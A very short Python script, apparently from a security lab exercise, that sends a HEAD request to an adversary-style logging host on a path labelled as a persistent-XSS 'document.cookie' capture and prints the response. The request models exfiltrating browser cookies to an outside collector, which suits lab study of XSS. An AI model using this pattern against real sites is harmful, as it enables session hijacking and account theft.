from flask import *
import requests as req

resp = req.head(url="https://lab-logger.adversary.io/29n3m8d1chc1jqu/xss-persistent/document.cookie")

print(resp)
